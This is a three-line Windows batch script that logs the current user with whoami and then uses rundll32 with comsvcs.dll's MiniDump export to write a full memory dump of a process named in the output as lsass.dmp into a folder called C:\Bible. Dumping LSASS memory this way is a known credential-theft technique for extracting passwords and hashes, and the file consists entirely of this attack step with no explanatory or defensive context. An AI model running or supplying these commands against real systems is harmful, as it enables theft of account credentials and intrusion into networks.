@echo off 
whoami > C:\Bible\lslog.txt 2>&1 
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 512 C:\Bible\lsass.dmp full >> C:\Bible\lslog.txt 2>&1 
